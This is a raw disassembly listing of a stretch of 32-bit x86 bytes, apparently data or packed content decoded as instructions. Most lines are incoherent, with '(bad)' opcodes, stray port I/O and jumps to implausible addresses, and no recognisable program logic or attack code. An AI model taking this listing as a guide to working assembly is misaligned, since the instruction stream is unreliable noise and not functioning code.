  43d94a:	push   0xffffffab
  43d94c:	push   esp
  43d94d:	add    BYTE PTR [eax+0x68004fa8],cl
  43d953:	jbe    0x43d95a
  43d955:	outs   dx,BYTE PTR ds:[esi]
  43d956:	dec    esp
  43d957:	cwde   
  43d958:	dec    esi
  43d959:	arpl   WORD PTR ds:0x4a635898,sp
  43d95f:	lds    ebx,FWORD PTR [ecx+0x6e]
  43d962:	push   eax
  43d963:	dec    edx
  43d964:	add    al,BYTE PTR [eax]
  43d966:	and    BYTE PTR [ebp+0x35],dh
  43d969:	arpl   WORD PTR ds:0x476354b4,si
  43d96f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d970:	add    al,BYTE PTR [eax]
  43d972:	out    dx,al
  43d973:	ja     0x43d9ab
  43d975:	imul   ecx,DWORD PTR [eax],0xb673655
  43d97b:	inc    edi
  43d97c:	daa    
  43d97d:	outs   dx,BYTE PTR ds:[esi]
  43d97e:	adc    BYTE PTR [edx+0x77240002],dl
  43d984:	inc    ecx
  43d985:	arpl   bp,di
  43d987:	xchg   BYTE PTR [eax+0x69],bl
  43d98a:	or     dh,BYTE PTR [eax]
  43d98c:	pop    esi
  43d98d:	fs sti 
  43d98f:	push   ebp
  43d990:	push   ebp
  43d991:	ins    DWORD PTR es:[edi],dx
  43d992:	jmp    0xbe47a80d
  43d997:	bound  esi,QWORD PTR ds:0xc441
  43d99d:	add    BYTE PTR [eax],al
  43d99f:	add    BYTE PTR [edx],bh
  43d9a1:	pop    es
  43d9a2:	pop    ebp
  43d9a3:	fst    QWORD PTR [ecx]
  43d9a5:	push   esp
  43d9a6:	arpl   WORD PTR [edx-0x2992a3ed],bp
  43d9ac:	sbb    ah,BYTE PTR [ebx+0x4d]
  43d9af:	les    esp,FWORD PTR [edi]
  43d9b1:	push   ebp
  43d9b2:	addr16 (bad) 
  43d9b4:	sbb    BYTE PTR [edi],bh
  43d9b6:	fs jmp 0x95471d32
  43d9bc:	(bad)  
  43d9bd:	dec    esi
  43d9be:	outs   dx,BYTE PTR ds:[esi]
  43d9bf:	mov    bl,ch
  43d9c1:	push   edx
  43d9c2:	addr16 mov esi,0xa9ff9176
  43d9c8:	les    esp,FWORD PTR [ecx+0x5f]
  43d9cb:	add    al,dl
  43d9cd:	bound  edx,QWORD PTR [eax+ebp*2-0x32]
  43d9d1:	bound  ebx,QWORD PTR [ecx+0x64]
  43d9d4:	dec    esp
  43d9d5:	add    cl,BYTE PTR [edi+0x3]
  43d9d8:	fstp   DWORD PTR [esi+0x70]
  43d9db:	push   esi
  43d9dc:	lds    esp,FWORD PTR [ebx+0x6f]
  43d9df:	dec    edi
  43d9e0:	mov    dl,0x4
  43d9e2:	popa   
  43d9e3:	ins    BYTE PTR es:[edi],dx
  43d9e4:	mov    cl,0xfe
  43d9e6:	int    0x4
  43d9e8:	popa   
  43d9e9:	pop    esp
  43d9ea:	gs popa 
  43d9ec:	dec    esp
  43d9ed:	adc    al,0x61
  43d9ef:	gs inc ebx
  43d9f1:	cmp    eax,0x5ab5465e
  43d9f6:	pop    ebp
  43d9f7:	add    ah,dh
  43d9f9:	add    DWORD PTR [ebx],edi
  43d9fb:	jb     0x43d97e
  43d9fd:	pop    edi
  43d9fe:	je     0x43da65
  43da00:	lods   al,BYTE PTR ds:[esi]
  43da01:	xor    BYTE PTR [edi+0x63],ah
  43da04:	add    BYTE PTR [eax],al
  43da06:	add    BYTE PTR [eax],al
  43da08:	add    BYTE PTR [ecx+0x31],dh
  43da0b:	imul   edx,DWORD PTR [edi-0x34],0x1
  43da0f:	mov    WORD PTR [eax],es
  43da11:	lahf   
  43da12:	xor    BYTE PTR [ebp+0x61],bl
  43da15:	shl    BYTE PTR [edx+0x3e],0x69
  43da19:	js     0x43da7e
  43da1b:	inc    ebp
  43da1c:	popa   
  43da1d:	mov    esp,0xc36e6131
  43da22:	adc    al,0x0
  43da24:	add    BYTE PTR [ecx+eax*1+0x44],al
  43da28:	jne    0x43d9e6
  43da2a:	pop    ebp
  43da2b:	popa   
  43da2c:	arpl   WORD PTR [ebp-0x42b7a2cb],bp
  43da32:	pop    edi
  43da33:	fs ins BYTE PTR es:[edi],dx
  43da35:	mov    cl,0x1
  43da37:	dec    eax
  43da38:	add    ebx,eax
  43da3a:	pop    esp
  43da3b:	pop    ebx
  43da3c:	popa   
  43da3d:	mov    eax,0x1656a07
  43da42:	add    DWORD PTR [ebx],ecx
  43da44:	add    al,0x2e
  43da46:	bound  ebp,QWORD PTR [ebx+0x75]
  43da49:	jne    0x43dac9
  43da4b:	pop    edi
  43da4c:	push   esp
  43da4d:	int    0x69
  43da4f:	pop    edi
  43da50:	pop    edi
  43da51:	(bad)  
  43da53:	cld    
  43da54:	lock ja 0x43d9e9
  43da57:	dec    ebp
  43da58:	ds aam 0x77
  43da5b:	cs arpl sp,dx
  43da5e:	jg     0x43da8c
  43da60:	je     0x43da09
  43da62:	(bad)  
  43da64:	jmp    0x26a9:0x6e650d71
  43da6b:	pop    ebp
  43da6c:	ins    BYTE PTR es:[edi],dx
  43da6d:	add    BYTE PTR [eax],al
  43da6f:	add    BYTE PTR [eax],al
  43da71:	add    BYTE PTR [ebx-0x479ca6d7],dh
  43da77:	inc    ebx
  43da78:	add    al,0xe6
  43da7a:	jno    0x43da69
  43da7c:	outs   dx,BYTE PTR fs:[esi]
  43da7e:	mov    DWORD PTR [esi],eax
  43da80:	pop    ebp
  43da81:	ins    BYTE PTR es:[edi],dx
  43da82:	mov    ah,0x7
  43da84:	push   0x5c165669
  43da89:	add    BYTE PTR [ebp-0x59],dh
  43da8c:	dec    DWORD PTR [ebx+0x52]
  43da8f:	cli    
  43da90:	pop    edi
  43da91:	dec    esp
  43da92:	dec    esp
  43da93:	stc    
  43da94:	dec    ebp
  43da95:	pop    edi
  43da96:	inc    edi
  43da97:	add    bh,BYTE PTR ds:0xf9b57500
  43da9d:	push   eax
  43da9e:	inc    edi
  43da9f:	add    dl,BYTE PTR [eax+0x63]
  43daa2:	and    eax,0x185d63c9
  43daa7:	test   al,0x4f
  43daa9:	dec    ebx
  43daaa:	adc    BYTE PTR [esi-0x24e3919d],dh
  43dab0:	cld    
  43dab1:	ret    
  43dab2:	je     0x43da50
  43dab4:	pop    ecx
  43dab5:	je     0x43daed
  43dab7:	xchg   BYTE PTR [esi+0x6e],cl
  43daba:	adc    BYTE PTR [ebp-0x76f2abb8],dh
  43dac0:	pop    ecx
  43dac1:	pop    edi
  43dac2:	adc    ebx,ebx
  43dac4:	cld    
  43dac5:	lods   eax,DWORD PTR ds:[esi]
  43dac6:	jns    0x43daca
  43dac8:	mov    dh,0x67
  43daca:	(bad)  
  43dacb:	pop    ebp
  43dacc:	xchg   edi,eax
  43dacd:	add    ecx,DWORD PTR [edx]
  43dacf:	push   DWORD PTR [ebp+0x7f2ee15e]
  43dad5:	push   ecx
  43dad6:	add    BYTE PTR [eax],al
  43dad8:	add    BYTE PTR [eax],al
  43dada:	add    dh,dl
  43dadc:	popa   
  43dadd:	mov    esi,DWORD PTR [ebx]
  43dadf:	fistp  DWORD PTR [ecx-0x76]
  43dae2:	push   ecx
  43dae3:	fimul  DWORD PTR [esi+0x70]
  43dae6:	add    ebp,DWORD PTR [eax-0x56a16a02]
  43daec:	cmp    eax,0x5cbc6051
  43daf1:	and    DWORD PTR [ebx-0x6f],ebp
  43daf4:	pop    ebp
  43daf5:	out    0x3,eax
  43daf7:	xchg   esp,eax
  43daf8:	(bad)  
  43daf9:	xor    eax,0x503c895f
  43dafe:	push   0x6b4a3296
  43db03:	(bad)  
  43db04:	dec    esi
  43db05:	dec    esp
  43db06:	push   edx
  43db07:	mov    dh,0x4a
  43db09:	out    0x3,eax
  43db0b:	lea    eax,[eax]
  43db0d:	sub    bl,BYTE PTR [edi+0x61]
  43db10:	xor    eax,0x5666600a
  43db15:	or     al,0x4c
  43db17:	cmp    dl,BYTE PTR [ebx+eax*1+0x68]
  43db1b:	push   esi
  43db1c:	sub    esp,edi
  43db1e:	add    edx,DWORD PTR [ebx-0x2]
  43db21:	adc    eax,0x3c495f
  43db26:	push   0x67002e56
  43db2b:	push   ss
  43db2c:	add    cl,BYTE PTR [edi+edi*8]
  43db2f:	inc    ebp
  43db30:	push   eax
  43db31:	ror    BYTE PTR [edi+0x16],1
  43db34:	cmp    al,0xc0
  43db36:	addr16 push ss
  43db38:	add    bh,BYTE PTR ds:0xbb5d3402
  43db3e:	cmp    eax,0x0
  43db43:	add    BYTE PTR [edx],dl
  43db45:	push   esi
  43db46:	les    eax,FWORD PTR [edx+0x9]
  43db49:	dec    esi
  43db4a:	add    BYTE PTR [ebx-0x4a8cdbf1],bh
  43db50:	rcl    DWORD PTR [ebp+0x51],cl
  43db53:	jmp    0xbb409dce
  43db58:	ret    
  43db59:	and    esp,DWORD PTR [edi+ebp*4-0x31]
  43db5d:	push   esi
  43db5e:	arpl   cx,bp
  43db60:	jbe    0x43dbdb
  43db62:	jmp    FWORD PTR [ecx+0x755f5fa4]
  43db68:	mov    ds:0x9b856740,eax
  43db6d:	xor    DWORD PTR [eax],eax
  43db6f:	xchg   esi,eax
  43db70:	ja     0x43dbb2
  43db72:	ins    BYTE PTR es:[edi],dx
  43db73:	pop    esp
  43db74:	ret    0x425a
  43db77:	push   eax
  43db78:	xchg   ebp,eax
  43db79:	pop    edi
  43db7a:	ds pop esp
  43db7c:	(bad)  
  43db7d:	pusha  
  43db7e:	arpl   WORD PTR [ebx-0x56],bx
  43db81:	add    al,BYTE PTR [eax]
  43db83:	mov    eax,0x35634170
  43db88:	scas   eax,DWORD PTR es:[edi]
  43db89:	pop    ebx
  43db8a:	ins    BYTE PTR es:[edi],dx
  43db8b:	dec    esp
  43db8c:	inc    edx
  43db8d:	pop    ebx
  43db8e:	jbe    0x43dbd4
  43db90:	cmp    al,0x4a
  43db92:	add    BYTE PTR [edx],bl
  43db94:	jge    0x43dbcb
  43db96:	arpl   WORD PTR ds:0x1d6d2335,dx
  43db9c:	sub    al,0x54
  43db9e:	outs   dx,BYTE PTR ds:[esi]
  43db9f:	(bad)  
  43dba0:	sub    BYTE PTR [edx],al
  43dba2:	add    BYTE PTR [ebx+0x70],bh
  43dba5:	inc    ecx
  43dba6:	arpl   bp,si
  43dba8:	add    BYTE PTR [eax],al
  43dbaa:	add    BYTE PTR [eax],al
  43dbac:	add    BYTE PTR [ebx+ebx*2],ch
  43dbaf:	ins    BYTE PTR es:[edi],dx
  43dbb0:	or     al,0x7d
  43dbb2:	pop    ebx
  43dbb3:	imul   eax,DWORD PTR [ecx+edi*2],0xffffffb0
  43dbb7:	jmp    FWORD PTR [ebp+ebx*1+0xdd56356]
  43dbbe:	inc    eax
  43dbbf:	lds    ecx,FWORD PTR [di]
  43dbc2:	xor    DWORD PTR [eax],eax
  43dbc4:	cmp    eax,0x634178
  43dbc9:	enter  0x6138,0x6c
  43dbcd:	mov    ecx,0xb3666605
  43dbd2:	sub    al,0x65
  43dbd4:	popa   
  43dbd5:	sub    BYTE PTR [edi+0x67],bl
  43dbd8:	outs   dx,BYTE PTR ds:[esi]
  43dbd9:	push   ds
  43dbda:	dec    edi
  43dbdb:	dec    eax
  43dbdc:	popa   
  43dbdd:	repnz sub DWORD PTR [ebp+eiz*2+0x4c],ebp
  43dbe2:	push   es
  43dbe3:	pop    ecx
  43dbe4:	add    al,0xf
  43dbe6:	sub    esi,DWORD PTR [esi+eax*2-0x1b]
  43dbea:	popa   
  43dbeb:	pop    ebp
  43dbec:	inc    ecx
  43dbed:	enter  0x6a59,0x69
  43dbf1:	out    dx,al
  43dbf2:	pop    edx
  43dbf3:	je     0x43dc5a
  43dbf5:	scas   eax,DWORD PTR es:[edi]
  43dbf6:	cld    
  43dbf7:	(bad)  
  43dbf8:	(bad)  
  43dbf9:	or     BYTE PTR ds:[ecx+0x6e],al
  43dbfd:	lds    ebx,FWORD PTR [edx+0x61]
  43dc00:	popa   
  43dc01:	mov    al,0x5f
  43dc03:	jb     0x43dc6a
  43dc05:	pop    edi
  43dc06:	pop    eax
  43dc07:	popa   
  43dc08:	je     0x43dbaf
  43dc0a:	sub    DWORD PTR [ecx+0x6c],ebx
  43dc0d:	pop    edi
  43dc0e:	sub    ebx,DWORD PTR [ebx+0x74]
  43dc11:	add    BYTE PTR [eax],al
  43dc13:	add    BYTE PTR [eax],al
  43dc15:	add    BYTE PTR [ebp-0x1aff99db],dh
  43dc1b:	or     BYTE PTR [ebp+eiz*2+0x7d],cl
  43dc1f:	pop    esp
  43dc20:	pop    ebp
  43dc21:	inc    ebx
  43dc22:	jle    0x43dc83
  43dc24:	je     0x43dc8f
  43dc26:	outs   dx,DWORD PTR ds:[esi]
  43dc27:	daa    
  43dc28:	ins    BYTE PTR es:[edi],dx
  43dc29:	push   ebx
  43dc2a:	jns    0x43dc55
  43dc2c:	je     0x43dc97
  43dc2e:	arpl   WORD PTR [eax+eax*1],sp
  43dc31:	add    dl,dh
  43dc33:	add    eax,0x2ab86e3d
  43dc38:	push   0x43
  43dc3a:	scas   al,BYTE PTR es:[edi]
  43dc3b:	pop    esi
  43dc3c:	je     0x43dca7
  43dc3e:	mov    edi,0xb9536c26
  43dc43:	sub    BYTE PTR [ecx+ebp*2+0x75],dh
  43dc47:	enter  0x5e,0x75
  43dc4b:	cli    
  43dc4c:	cld    
  43dc4d:	inc    ebx
  43dc4e:	adc    bh,dl
  43dc50:	addr16 je 0x43dc6b
  43dc53:	ins    BYTE PTR es:[edi],dx
  43dc54:	push   edx
  43dc55:	addr16 add edx,eax
  43dc58:	popa   
  43dc59:	pop    edi
  43dc5a:	loope  0x43dbf8
  43dc5c:	addr16 pop ebp
  43dc5e:	loope  0x43dbf2
  43dc60:	pop    ebp
  43dc61:	push   0x75
  43dc63:	mov    ds:0x89cc4203,al
  43dc68:	pusha  
  43dc69:	inc    edx
  43dc6a:	fcomp  QWORD PTR [ebp-0x6d4c8baf]
  43dc70:	pop    eax
  43dc71:	arpl   WORD PTR [edx+0x7429fcab],bp
  43dc77:	jno    0x43dcd4
  43dc79:	push   0x0
  43dc7b:	add    BYTE PTR [eax],al
  43dc7d:	add    BYTE PTR [eax],al
  43dc7f:	cdq    
  43dc80:	ins    BYTE PTR es:[edi],dx
  43dc81:	pop    eax
  43dc82:	imul   esp,DWORD PTR [esi+0x7443044e],0x916a54e9
  43dc8c:	jmp    0xe9cd54f1
  43dc91:	push   esp
  43dc92:	ins    BYTE PTR es:[edi],dx
  43dc93:	nop
  43dc94:	and    BYTE PTR [edx+eax*4],al
  43dc97:	ja     0x43dc81
  43dc99:	pusha  
  43dc9a:	je     0x43dc3d
  43dc9c:	inc    ebx
  43dc9d:	push   edx
  43dc9e:	arpl   WORD PTR [edi+eax*2+0x43],dx
  43dca2:	imul   ebx,DWORD PTR [ebx+0x1f],0xab697861
  43dca9:	cld    
  43dcaa:	mov    ?,WORD PTR [ecx-0x4]
  43dcad:	pusha  
  43dcae:	je     0x43dcd9
  43dcb0:	add    edx,DWORD PTR [edx+0x63]
  43dcb3:	push   esp
  43dcb4:	cmovae ebp,DWORD PTR [ecx+0x53]
  43dcb8:	mov    bh,0x61
  43dcba:	js     0x43dcfd
  43dcbc:	stos   DWORD PTR es:[edi],eax
  43dcbd:	cld    
  43dcbe:	dec    ebx
  43dcbf:	ja     0x43dca9
  43dcc1:	pusha  
  43dcc2:	je     0x43dd09
  43dcc4:	add    dl,ch
  43dcc6:	pusha  
  43dcc7:	inc    eax
  43dcc8:	daa    
  43dcc9:	(bad)  
  43dcca:	push   esp
  43dccb:	xor    ah,BYTE PTR [esi]
  43dccd:	out    0x3,eax
  43dccf:	rol    BYTE PTR ds:0x2f1b66b3,cl
  43dcd5:	shl    BYTE PTR [ecx+0x22],1
  43dcd8:	les    esi,FWORD PTR ss:[edi]
  43dcdb:	or     eax,0xd962cc34
  43dce0:	add    dh,BYTE PTR [edx]
  43dce2:	or     BYTE PTR [eax],al
  43dce4:	add    BYTE PTR [eax],al
  43dce6:	add    BYTE PTR [eax],al
  43dce8:	les    esp,FWORD PTR [ecx]
  43dcea:	nop
  43dceb:	push   edi
  43dcec:	mov    bh,0x2f
  43dcee:	xchg   ebp,eax
  43dcef:	ds out 0x2e,al
  43dcf2:	fwait
  43dcf3:	pop    edx
  43dcf4:	lds    ebp,FWORD PTR [esi]
  43dcf6:	test   BYTE PTR [eax-0x55],al
  43dcf9:	sub    al,0x8c
  43dcfb:	fs leave 
  43dcfd:	xor    esp,edi
  43dcff:	add    esi,DWORD PTR [esi]
  43dd01:	add    ch,BYTE PTR [edx+0x7443a966]
  43dd07:	push   ebp
  43dd08:	fwait
  43dd09:	and    eax,0x2ac95851
  43dd0e:	push   ebp
  43dd0f:	addr16 mov edx,0x75682026
  43dd15:	add    al,bl
  43dd17:	add    esi,DWORD PTR [ecx-0x5db7c9d1]
  43dd1d:	ss inc esp
  43dd1f:	cmp    BYTE PTR [edx+0x5c384c2d],dl
  43dd25:	dec    eax
  43dd26:	inc    eax
  43dd27:	pusha  
  43dd28:	push   esi
  43dd29:	push   esi
  43dd2a:	adc    BYTE PTR [edi+0x56],bl
  43dd2d:	add    ah,BYTE PTR [edx]
  43dd2f:	pop    es
  43dd30:	dec    ecx
  43dd31:	xor    ebx,DWORD PTR [ebx]
  43dd33:	push   esi
  43dd34:	xor    BYTE PTR [edx],dh
  43dd36:	adc    BYTE PTR [ebx+0x75],al
  43dd39:	add    dl,BYTE PTR [eax+0x5]
  43dd3c:	xor    al,0x25
  43dd3e:	repz cmp DWORD PTR [esi+ebp*1+0x0],ecx
  43dd43:	cld    
  43dd44:	push   ebx
  43dd45:	and    ecx,DWORD PTR [edx+0x8]
  43dd48:	dec    edx
  43dd49:	and    eax,DWORD PTR [edx-0x2a]
  43dd4c:	add    BYTE PTR [eax],al
  43dd4e:	add    BYTE PTR [eax],al
  43dd50:	add    BYTE PTR [eax+0x54],cl
  43dd53:	imul   ecx,ebp,0xa4632b43
  43dd59:	adc    eax,0x46d56a33
  43dd5e:	sub    DWORD PTR [edi-0x29],esp
  43dd61:	sub    dl,BYTE PTR [ecx+0x0]
  43dd64:	push   0x70
  43dd66:	inc    ecx
  43dd67:	arpl   WORD PTR [ebp-0x4694dc56],di
  43dd6d:	mov    esp,0xb48c6c27
  43dd72:	pop    edi
  43dd73:	imul   eax,DWORD PTR [ebp+ebx*4+0x79890002],0x4b
  43dd7b:	imul   edx,DWORD PTR [edi-0x6a98bb2d],0x967843db
  43dd85:	jbe    0x43dd30
  43dd87:	std    
  43dd88:	lahf   
  43dd89:	xchg   esp,eax
  43dd8a:	arpl   WORD PTR ss:[ebx-0x36],di
  43dd8e:	sub    DWORD PTR [ebp+0x52],ebx
  43dd91:	mov    WORD PTR [esi],fs
  43dd93:	inc    edi
  43dd94:	dec    edi
  43dd95:	xchg   esi,eax
  43dd96:	xor    BYTE PTR [ebx+0x44],ah
  43dd99:	pushf  
  43dd9a:	sub    al,0x74
  43dd9c:	jmp    0x30418317
  43dda1:	mov    ds:0x953b6336,eax
  43dda6:	sub    DWORD PTR [ebp+0x42],ebx
  43dda9:	pop    esp
  43ddaa:	es inc esp
  43ddac:	inc    esp
  43ddad:	push   esi
  43ddae:	xor    BYTE PTR [ebx+0x14],ah
  43ddb1:	dec    esp
  43ddb2:	sub    al,0x74
  43ddb4:	jmp    0x43ddb9
  43ddb9:	add    BYTE PTR [esi+0x1b],dh
  43ddbc:	jmp    FWORD PTR [ebx]
  43ddbe:	inc    ecx
  43ddbf:	xor    bl,BYTE PTR [edi-0x1]
  43ddc2:	push   edx
  43ddc3:	inc    ebx
  43ddc4:	push   0x0
  43ddc6:	ret    0x6a5d
  43ddc9:	outs   dx,DWORD PTR ds:[esi]
  43ddca:	push   0x21
  43ddcc:	pop    ebp
  43ddcd:	outs   dx,BYTE PTR ds:[esi]
  43ddce:	mov    al,0xf3
  43ddd0:	jae    0x43de44
  43ddd2:	jne    0x43de34
  43ddd4:	pop    edi
  43ddd5:	jae    0x43ddba
  43ddd7:	add    al,bl
  43ddd9:	add    ah,ah
  43dddb:	sub    DWORD PTR [ecx+0x70],ebx
  43ddde:	fstp   QWORD PTR [esi+0x6c]
  43dde1:	outs   dx,DWORD PTR ds:[esi]
  43dde2:	mov    edi,0xc402c702
  43dde7:	sub    DWORD PTR [ecx+0x70],ebx
  43ddea:	rcl    BYTE PTR [eax+0x5d],cl
  43dded:	gs pop esp
  43ddef:	add    al,ch
  43ddf1:	add    dl,BYTE PTR [ebx+ebp*1]
  43ddf4:	pop    ecx
  43ddf5:	jo     0x43de06
  43ddf7:	push   esp
  43ddf8:	pop    ebp
  43ddf9:	popa   
  43ddfa:	add    BYTE PTR [ebx],ch
  43ddfc:	add    BYTE PTR [eax],al
  43ddfe:	pop    ebx
  43ddff:	push   es
  43de00:	dec    edx
  43de01:	gs out dx,eax
  43de03:	sub    dh,BYTE PTR [ebp+eax*2-0x3e]
  43de07:	sub    ah,BYTE PTR [esi+0x74]
  43de0a:	dec    esp
  43de0b:	add    bh,BYTE PTR [ebp+0x0]
  43de0e:	fist   WORD PTR [ebx+0x5d]
  43de11:	popa   
  43de12:	mov    al,ds:0xb1763d2a
  43de17:	pop    esp
  43de18:	je     0x43de71
  43de1a:	or     al,0x2
  43de1c:	mov    BYTE PTR [eax+eax*1],0x0
  43de20:	add    BYTE PTR [eax],al
  43de22:	add    BYTE PTR [eax+0x50],dl
  43de25:	jno    0x43de6c
  43de27:	dec    edx
  43de28:	pop    edx
  43de29:	pop    ebp
  43de2a:	jb     0x43de7b
  43de2c:	push   eax
  43de2d:	popa   
  43de2e:	je     0x43ddd5
  43de30:	and    DWORD PTR [ecx+0x6c],ebx
  43de33:	(bad)  
  43de34:	sub    ebx,DWORD PTR [ebx+0x74]
  43de37:	xor    eax,0x4500665d
  43de3c:	add    DWORD PTR [ebx],edi
  43de3e:	jb     0x43deb1
  43de40:	daa    
  43de41:	je     0x43dea8
  43de43:	jne    0x43de3e
  43de45:	imul   bx,WORD PTR [edx+0x17],0x67
  43de4a:	push   esp
  43de4b:	dec    ebp
  43de4c:	mov    ecx,0xab515f67
  43de51:	cld    
  43de52:	jg     0x43deca
  43de54:	in     al,0x53
  43de56:	arpl   WORD PTR [ebx],bx
  43de58:	sbb    ecx,DWORD PTR [esi+0x69]
  43de5b:	push   ss
  43de5c:	into   
  43de5d:	dec    ebp
  43de5e:	ins    DWORD PTR es:[edi],dx
  43de5f:	jne    0x43de96
  43de61:	dec    BYTE PTR [edi+0x7]
  43de64:	les    ebx,FWORD PTR [ebp+0x63]
  43de67:	push   es
  43de68:	fmul   DWORD PTR ds:0x4ed23b2e
  43de6e:	ins    DWORD PTR es:[edi],dx
  43de6f:	add    DWORD PTR [esp+edi*8+0x4e9b7697],edx
  43de76:	imul   edx,esi,0xa66d4dc6
  43de7c:	fnstcw WORD PTR [edx]
  43de7e:	arpl   bp,bx
  43de80:	xchg   edi,eax
  43de81:	xor    DWORD PTR [eax],eax
  43de83:	jne    0x43deda
  43de85:	std    
  43de86:	cmp    al,0x0
  43de88:	add    BYTE PTR [eax],al
  43de8a:	add    BYTE PTR [eax],al
  43de8c:	mov    DWORD PTR [esi-0x60278b9d],0x93c96959
  43de96:	ins    BYTE PTR es:[di],dx
  43de98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43de99:	js     0x43dea9
  43de9b:	dec    ebp
  43de9c:	fwait
  43de9d:	mov    cl,BYTE PTR [ebp+ebp*2-0x73]
  43dea1:	push   esp
  43dea2:	pop    eax
  43dea3:	add    BYTE PTR [ebp-0x17],dh
  43dea6:	std    
  43dea7:	inc    eax
  43dea8:	cwde   
  43dea9:	pop    edi
  43deaa:	xor    al,0x6e
  43deac:	pushf  
  43dead:	push   ebp
  43deae:	pop    ebp
  43deaf:	je     0x43de49
  43deb1:	sbb    ecx,DWORD PTR [esi+0x69]
  43deb4:	xchg   ebx,eax
  43deb5:	push   edx
  43deb6:	pusha  
  43deb7:	arpl   WORD PTR [esi-0x1],ax
  43deba:	dec    ebp
  43debb:	addr16 pop ebx
  43debd:	inc    esp
  43debe:	xor    eax,DWORD PTR [eax]
  43dec0:	jne    0x43dec4
  43dec2:	jecxz  0x43dec5
  43dec4:	xor    al,0x27
  43dec6:	adc    esi,DWORD PTR [ebx+eiz*2]
  43dec9:	sub    ebx,DWORD PTR [ecx]
  43decb:	arpl   WORD PTR [ecx+0x27],ax
  43dece:	aaa    
  43decf:	push   edx
  43ded0:	dec    esp
  43ded1:	and    al,0x10
  43ded3:	pusha  
  43ded4:	push   esi
  43ded5:	dec    ebx
  43ded6:	or     DWORD PTR [eax+0x44],ebx
  43ded9:	add    cl,BYTE PTR [edx+0x1]
  43dedc:	cmp    dh,BYTE PTR [edi]
  43dede:	add    al,0x52
  43dee0:	sub    dl,BYTE PTR [edx-0x34]
  43dee3:	push   ecx
  43dee4:	pop    ss
  43dee5:	sub    eax,0x2c325ed5
  43deea:	(bad)  
  43deeb:	dec    ax
  43deed:	sub    eax,0x5dd4
  43def2:	add    BYTE PTR [eax],al
  43def4:	add    BYTE PTR [ecx],cl
  43def6:	daa    
  43def7:	mov    ch,0x3
  43def9:	cdq    
  43defa:	add    ah,BYTE PTR [edx-0x3eba169a]
  43df00:	push   ebp
  43df01:	shl    BYTE PTR [eax],cl
  43df03:	mov    edx,0x9125ce5d
  43df08:	push   edi
  43df09:	(bad)  
  43df0a:	and    DWORD PTR [ebp-0x7cdf4da6],edx
  43df10:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43df12:	add    ah,BYTE PTR [esi]
  43df14:	or     BYTE PTR [ecx-0x65998ad6],ch
  43df1a:	es mov dh,0x11
  43df1d:	mov    bh,0x29
  43df1f:	jne    0x43df71
  43df21:	mov    eax,ds:0xc9082302
  43df26:	sub    dl,BYTE PTR [ebp+0x67]
  43df29:	mov    edx,0xbf121626
  43df2e:	and    eax,0x275584f
  43df33:	clc    
  43df34:	push   es
  43df35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43df36:	sub    DWORD PTR [ebx+0x67],ecx
  43df39:	cmp    BYTE PTR [edx],ch
  43df3b:	dec    eax
  43df3c:	push   edx
  43df3d:	dec    ecx
  43df3e:	sub    eax,DWORD PTR [eax]
  43df40:	and    al,0x42
  43df42:	cs je  0x43df85
  43df45:	aaa    
  43df46:	xor    esi,DWORD PTR [esp+ecx*1+0x71]
  43df4a:	mov    ecx,0x365a25fe
  43df4f:	dec    eax
  43df50:	or     BYTE PTR [ebx],ch
  43df52:	es ins BYTE PTR es:[edi],dx
  43df54:	add    al,0x7e
  43df56:	sub    BYTE PTR [edx+0x16],ah
  43df59:	add    BYTE PTR [eax],al
  43df5b:	add    BYTE PTR [eax],al
  43df5d:	add    BYTE PTR [edi],ah
  43df5f:	daa    
  43df60:	pop    edi
  43df61:	cmc    
  43df62:	dec    edi
  43df63:	sub    DWORD PTR [edx-0x17],ebp
  43df66:	jbe    0x43dfe0
  43df68:	std    
  43df69:	and    eax,0xc85e2915
  43df6e:	cmp    cl,BYTE PTR [esi+0x69]
  43df71:	retf   0x22d
  43df74:	add    BYTE PTR [esp+esi*2],ch
  43df77:	inc    ecx
  43df78:	ins    BYTE PTR es:[edi],dx
  43df79:	mov    esi,0x9c6c5b14
  43df7e:	sbb    BYTE PTR [esi],ch
  43df80:	imul   ecx,edx,0x2e0002cd
  43df86:	jb     0x43dfde
  43df88:	ins    BYTE PTR es:[edi],dx
  43df89:	mov    edx,0xbf741fb9
  43df8e:	xlat   BYTE PTR ds:[ebx]
  43df8f:	cs jae 0x43df16
  43df92:	jbe    0x43df5e
  43df94:	add    edi,DWORD PTR [ebp-0x7bb2d256]
  43df9a:	stos   BYTE PTR es:[edi],al
  43df9b:	push   eax
  43df9c:	pop    edi
  43df9d:	xchg   ebp,eax
  43df9e:	mov    ds:0x7a29001f,eax
  43dfa3:	push   esi
  43dfa4:	arpl   WORD PTR [ebx-0x35],di
  43dfa7:	and    ebp,DWORD PTR [edx-0x78]
  43dfaa:	retf   0x501f
  43dfad:	pop    ebx
  43dfae:	mov    esi,0xaa5a635d
  43dfb3:	add    al,BYTE PTR [eax]
  43dfb5:	or     dh,BYTE PTR [eax+0x40]
  43dfb8:	addr16 cmp eax,0x675694
  43dfbe:	mov    eax,ds:0x6f5421
  43dfc3:	add    BYTE PTR [eax],al
  43dfc5:	add    BYTE PTR [eax],al
  43dfc7:	cwde   
  43dfc8:	push   edi
  43dfc9:	imul   eax,DWORD PTR [ebp+edi*1+0x52],0x5d
  43dfce:	push   esp
  43dfcf:	xor    eax,0xa6005d59
  43dfd4:	add    DWORD PTR [ebx+esi*2+0x68],ebp
  43dfd8:	push   esp
  43dfd9:	pop    ebx
  43dfda:	jo     0x43e041
  43dfdc:	pop    eax
  43dfdd:	cmp    DWORD PTR [eax],eax
  43dfdf:	pop    ecx
  43dfe0:	add    al,0x3f
  43dfe2:	gs mov eax,0xac6d5cea
  43dfe8:	out    dx,al
  43dfe9:	pop    eax
  43dfea:	je     0x43e060
  43dfec:	out    dx,eax
  43dfed:	(bad)  
  43dfee:	(bad)  
  43dfef:	mov    eax,0xc0693e05
  43dff4:	and    DWORD PTR [ecx+ebp*2-0x3f],edx
  43dff8:	and    DWORD PTR [edi+ebp*2-0x30],edx
  43dffc:	push   edi
  43dffd:	pop    ebx
  43dffe:	popa   
  43dfff:	rol    BYTE PTR [eax+0x61],0x6c
  43e003:	test   eax,0x396d60ea
  43e008:	push   es
  43e009:	pop    edi
  43e00a:	add    edx,DWORD PTR [ecx]
  43e00c:	push   ebx
  43e00d:	ins    BYTE PTR es:[edi],dx
  43e00e:	je     0x43e045
  43e010:	inc    eax
